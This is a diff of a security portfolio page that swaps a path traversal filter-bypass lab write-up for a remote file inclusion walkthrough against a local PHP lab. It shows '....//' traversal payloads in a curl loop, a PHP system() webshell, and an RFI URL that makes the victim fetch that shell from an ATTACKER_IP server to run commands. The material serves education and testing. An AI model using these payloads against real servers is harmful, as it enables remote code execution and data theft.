@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Level 2 — Blacklist Filter Bypass — Mostafa Elwaseef's Portfolio</title>
+  <title>Lab 5 — Real RFI — Mostafa Elwaseef's Portfolio</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
   <style>
@@ -99,16 +99,16 @@
 <body>
 <nav>
   <span class="nav-logo">Waseef</span>
-  <a href="../../../index.html" class="nav-back">← Back to Portfolio</a>
+  <a href="../../index.html" class="nav-back">← Back to Portfolio</a>
 </nav>
 
 <div class="hero">
   <div class="hero-inner">
-    <div class="breadcrumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../index.html#labs">Labs</a> / <a href="index.html">Custom Lab</a> / Level 2 — Blacklist Filter Bypass</div>
-    <h1>Level 2 — Blacklist Filter Bypass</h1>
+    <div class="breadcrumb"><a href="../../index.html">Portfolio</a> / <a href="../../index.html#customlab">Custom Lab</a> / Lab 5 — Real RFI</div>
+    <h1>Lab 5 — Real RFI</h1>
     <div class="meta-row">
-      <span class="badge badge-hard">🔴 High</span>
-      <span class="badge badge-date">📅 2026-07-21</span>
+      <span class="badge badge-hard">🔴 Critical</span>
+      <span class="badge badge-date">📅 2026-07-23</span>
     </div>
   </div>
 </div>
@@ -118,76 +118,77 @@
 <div class='table-wrap'><table>
   <tr><th>Field</th><th>Value</th></tr>
   <tr><td><strong>Type</strong></td><td>Web App</td></tr>
-  <tr><td><strong>Severity</strong></td><td>🔴 High</td></tr>
-  <tr><td><strong>CVE / CWE</strong></td><td>CWE-22, CWE-184</td></tr>
-  <tr><td><strong>Date</strong></td><td>2026-07-21</td></tr>
+  <tr><td><strong>Severity</strong></td><td>🔴 Critical</td></tr>
+  <tr><td><strong>CVE / CWE</strong></td><td>CWE-98, CWE-73</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-07-23</td></tr>
 </table></div>
 <hr>
 <h2 id="description">🔍 Description</h2>
-<p>The application strips <code>../</code> from user input before passing it to PHP’s <code>include()</code> function, but the filter performs only a single, non-recursive pass. An attacker can embed <code>../</code> inside a longer sequence — <code>....//</code> — so that when the filter removes the inner <code>../</code>, the surrounding characters collapse back into a valid traversal step. This is a textbook non-recursive blacklist bypass: the defense is defeated by crafting input that only becomes dangerous after the filter acts on it.</p>
+<p>Level 5 presents a PHP application that passes user-supplied input directly into an <code>include()</code> statement without any filtering or sanitization. Unlike Local File Inclusion, this instance has <code>allow_url_include=On</code> set in <code>php.ini</code>, which instructs PHP’s <code>include()</code> to accept remote HTTP URLs in addition to local file paths. By supplying a URL pointing to an attacker-controlled server as the <code>page</code> parameter, the victim PHP engine fetches and executes the remote file as PHP code. Hosting a simple webshell at that URL gives the attacker full Remote Code Execution on the web server.</p>
 <hr>
 <h2 id="end-goals">🎯 End Goals</h2>
 <ul>
-  <li>Confirm that the blacklist strips <code>../</code> and blocks standard traversal</li>
-  <li>Identify and exploit the <code>....//</code> bypass technique</li>
-  <li>Read <code>flags/flag2.txt</code> to capture the flag</li>
+  <li>Confirm the application is vulnerable to Remote File Inclusion (not just LFI)</li>
+  <li>Host a PHP webshell on an attacker-controlled HTTP server</li>
+  <li>Include the remote webshell via the vulnerable <code>page</code> parameter to achieve RCE</li>
+  <li>Retrieve the flag from <code>/var/www/html/flags/flag5.txt</code></li>
 </ul>
 <hr>
 <h2 id="steps-to-reproduce">🪜 Steps to Reproduce</h2>
 <ol>
-  <li>Navigate to the target and observe that the <code>page</code> parameter controls which file is included</li>
-  <li>Submit a standard <code>../</code> traversal payload and confirm the blacklist strips it</li>
-  <li>Craft the <code>....//</code> bypass so the filter reconstructs <code>../</code> after acting on the input</li>
-  <li>Confirm the correct traversal depth using the bypass against a known file</li>
-  <li>Apply the bypass to <code>flags/flag2.txt</code> to retrieve the flag</li>
+  <li>Identify the <code>page</code> parameter in <code>level5.php</code> as a potential file inclusion point.</li>
+  <li>Confirm RFI by supplying a remote URL as the <code>page</code> value and observing a connection error rather than a local file error — this proves <code>allow_url_include=On</code>.</li>
+  <li>Create a PHP webshell on the attacker machine.</li>
+  <li>Start an HTTP server to serve the webshell, then trigger it via the vulnerable parameter to confirm RCE.</li>
+  <li>Locate the flag file using the RCE webshell.</li>
+  <li>Retrieve the flag.</li>
 </ol>
 <hr>
 <h2 id="analysis">🧠 Analysis</h2>
-<p><strong>Step 1 — Observe the application</strong></p>
-<p>Navigating to <code>http://localhost:8080/level2.php</code> reveals the same page-navigation interface as Level 1. The title reads “Level 2 - Blacklist Filter (bypassable)”, hinting that some form of input filtering is in place. The default <code>page=welcome.txt</code> loads normally, confirming the parameter is still active.</p>
-<blockquote>  <figure><img src="images/level-2-blacklist-filter-bypass/3a4b7523717280c183dfc3a3bcbf4d3a.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 1 — Identify potential file inclusion vulnerability</strong></p>
+<p>Navigating to <code>level5.php</code> with the default <code>page=welcome.txt</code> parameter shows “Loading: includes/welcome.txt”, the same structure as previous labs. This indicates the <code>page</code> parameter is passed directly to PHP’s <code>include()</code> function and is a candidate for file inclusion exploitation.</p>
+<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280989e7eff2d42f18f18.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 2 — Confirm the blacklist strips </strong><strong><code>../</code></strong></p>
-<p>The standard four-level payload <code>../../../../etc/passwd</code> was submitted. Instead of resolving the traversal, the application showed <code>Loading: includes/etc/passwd</code> — all four <code>../</code> sequences had been silently removed, leaving just <code>etc/passwd</code> appended to the <code>includes/</code> prefix. The resulting path failed to open, confirming the blacklist is active and performing a naive string strip of <code>../</code>.</p>
-<blockquote>  <figure><img src="images/level-2-blacklist-filter-bypass/3a4b752371728015a017e48d8c266fa7.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 2 — Verify RFI capability</strong></p>
+<p>Before exploiting, the vulnerability type must be confirmed. Passing a remote URL — <code>page=http://&lt;ATTACKER_IP&gt;:9999/shell.php</code> — to the <code>page</code> parameter returns the error <code>failed to open stream: Connection refused</code>. This is the critical distinction: a local file error would say “No such file or directory”, whereas “Connection refused” means PHP actually attempted an outbound HTTP request to the attacker’s server. This proves <code>allow_url_include=On</code> is set in <code>php.ini</code> and confirms the application is vulnerable to RFI, not just LFI.</p>
+<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280999e4befc621c1d7a4.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 3 — Bypass the filter with </strong><strong><code>....//</code></strong></p>
-<p>The bypass payload <code>....//....//....//....//etc/passwd</code> was submitted. The blacklist scans the input for <code>../</code> and finds it embedded within each <code>....//</code> sequence at positions 2–4 (<code>.</code> <code>.</code> <code>/</code>). After removing that substring, the remaining characters (<code>.</code> <code>.</code> <code>/</code>) reconstruct a valid <code>../</code> step. Four <code>....//</code> sequences therefore produce four <code>../</code> steps after filtering. The application showed <code>Loading: includes/../../../../etc/passwd</code> and returned the full contents of <code>/etc/passwd</code>, confirming the bypass worked.</p>
-<blockquote>  <figure><img src="images/level-2-blacklist-filter-bypass/3a4b752371728005b70af430b999877a.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 3 — Create the PHP webshell</strong></p>
+<p>A minimal one-liner webshell is written to <code>shell.php</code> on the attacker machine: <code>&lt;?php system($_GET["cmd"]); ?&gt;</code>. This file accepts an OS command via the <code>cmd</code> query parameter and executes it using PHP’s <code>system()</code> function. The victim PHP engine will fetch and evaluate this file — the attacker's own server only needs to serve the raw text, not execute it.</p>
+<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b752371728044a548f340bdfd1508.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 4 — Attempt to reach the flags directory with standard </strong><strong><code>../</code></strong></p>
-<p>Before applying the bypass to the flags directory, a standard payload <code>../../../../flags/flag2.txt</code> was submitted. As expected, the blacklist stripped all <code>../</code> sequences, producing <code>Loading: includes/flags/flag2.txt</code>, which failed to open. This confirmed that the bypass is required for every traversal attempt against this application, not just for <code>/etc/passwd</code>.</p>
-<blockquote>  <figure><img src="images/level-2-blacklist-filter-bypass/3a4b75237172806cb53ad36e5f25e7cf.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 4 — Serve the webshell and confirm RCE</strong></p>
+<p>A Python HTTP server is started with <code>python3 -m http.server 9999</code>, making <code>shell.php</code> accessible at <code>http://&lt;ATTACKER_IP&gt;:9999/shell.php</code>. The webshell is then triggered by requesting <code>page=http://&lt;ATTACKER_IP&gt;:9999/shell.php&amp;cmd=id</code>. The victim PHP engine fetches <code>shell.php</code>, executes it, and returns <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> in the response, confirming full RCE as the <code>www-data</code> user.</p>
+<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280c0965adc4c557f160a.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-5-real-rfi/3a6b75237172802f8a68f121ed422419.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 5 — Confirm traversal depth for the flags directory</strong></p>
-<p>The same for loop from Level 1 was re-used, this time replacing <code>../</code> with <code>....//</code> as the traversal unit and targeting <code>flags/flag1.txt</code> as a known reference point:</p>
-<pre><code class="language-python">for i in 1 2 3 4; do<br>  DOTS=$(python3 -c "print('..../'*$i)")<br>  echo "--- $i levels ---"<br>  curl -s "http://localhost:8080/level2.php?page=${DOTS}flags/flag1.txt" | grep -v "Warning\|failed"<br>done</code></pre>
-<p>At 1 level, <code>....//flags/flag1.txt</code> resolved correctly and returned <code>FLAG{lvl1_baseline_lfi_no_filter}</code>, confirming that the flags directory is one level above <code>includes/</code> — the same layout as Level 1.</p>
-<blockquote>  <figure><img src="images/level-2-blacklist-filter-bypass/3a4b7523717280e9b6eed763f07067e7.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 5 — Locate the flag</strong></p>
+<p>With RCE confirmed, the command <code>find / -name flag5.txt 2&gt;/dev/null</code> is passed via <code>curl</code> by appending <code>&amp;cmd=find+/-name+flag5.txt+2&gt;/dev/null</code> to the RFI URL. The output reveals the flag at <code>/var/www/html/flags/flag5.txt</code>.</p>
+<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b752371728017b69dca8e001d2cd1.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 6 — Retrieve the flag in the browser</strong></p>
-<p>With the correct depth confirmed, the payload <code>....//flags/flag2.txt</code> was submitted in the browser. After the filter stripped the inner <code>../</code> from <code>....//</code>, the path resolved to <code>includes/../flags/flag2.txt</code>, which points to <code>/var/www/html/flags/flag2.txt</code>. The flag was returned: <strong><code>FLAG{lvl2_blacklist_bypass_dotdotslash}</code></strong></p>
-<blockquote>  <figure><img src="images/level-2-blacklist-filter-bypass/3a4b7523717280829e5dd824449778f1.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 6 — Retrieve the flag</strong></p>
+<p>Navigating to the RFI URL in the browser with <code>cmd=cat+/var/www/html/flags/flag5.txt</code> executes the command and renders the output inline: <strong><code>FLAG{lvl5_real_rfi_remote_shell}</code></strong>.</p>
+<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280fa910bc17994f5ceb7.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
 <h2 id="impact">🎯 Impact</h2>
-<p>The blacklist provides no real security because it makes only a single pass over the input. Any payload that embeds <code>../</code> inside a longer string — <code>....//</code>, <code>..././</code>, URL-encoded variants, or Unicode equivalents — trivially reconstructs the traversal sequence after the filter runs. An unauthenticated attacker retains the full ability to read arbitrary files from the web server with minimal additional effort.</p>
+<p>An attacker who identifies <code>allow_url_include=On</code> can achieve full Remote Code Execution on the web server as the <code>www-data</code> user with no authentication required. This allows reading of arbitrary files, exfiltration of sensitive data, modification of web application files, and potential lateral movement within the server or internal network. RFI is generally considered more severe than LFI because it does not require any prior access to the target filesystem — the attacker supplies the payload entirely from their own infrastructure.</p>
 <hr>
 <h2 id="references">📚 References</h2>
 <ul>
-  <li><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</a></li>
-  <li><a href="https://cwe.mitre.org/data/definitions/184.html" target="_blank" rel="noopener">CWE-184: Incomplete List of Disallowed Inputs</a></li>
-  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank" rel="noopener">OWASP Testing Guide — Local File Inclusion</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank" rel="noopener">OWASP: Testing for Remote File Inclusion</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank" rel="noopener">CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/73.html" target="_blank" rel="noopener">CWE-73: External Control of File Name or Path</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#rfi-remote-file-inclusion" target="_blank" rel="noopener">Remote File Inclusion — HackTricks</a></li>
 </ul>
-<hr>
 
 </div>
 
-<footer>Built by Waseef · <a href="../../../index.html">Back to Portfolio</a></footer>
+<footer>Built by Waseef · <a href="../../index.html">Back to Portfolio</a></footer>
 </body>
 </html>
